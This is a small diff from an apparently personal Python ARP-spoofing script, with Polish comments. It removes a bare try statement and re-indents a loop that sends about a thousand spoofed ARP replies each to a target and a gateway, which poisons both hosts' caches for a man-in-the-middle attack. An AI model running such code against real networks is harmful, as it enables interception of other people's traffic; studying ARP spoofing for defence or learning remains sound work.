@@ -30,8 +30,9 @@ def main_function(targetip, gatewayip):
     gatewayMAC = getMACAddress(gatewayip)
 
     # # spoofing
-    try:
-        for i in range(1,1000):
-            sendspoofedreply(targetip, targetMAC, gatewayip)  # do targetip wysyłamy pakiet z gatewayip
-            sendspoofedreply(gatewayip, gatewayMAC, targetip)  # do gatewayip wysyłamy pakiet z targetip
+
+    for i in range(1,1000):
+        sendspoofedreply(targetip, targetMAC, gatewayip)  # do targetip wysyłamy pakiet z gatewayip
+        sendspoofedreply(gatewayip, gatewayMAC, targetip)  # do gatewayip wysyłamy pakiet z targetip
+
     return 'Spoofing done-> Target MAC: ', targetMAC, ' Gateway MAC: ', gatewayMAC
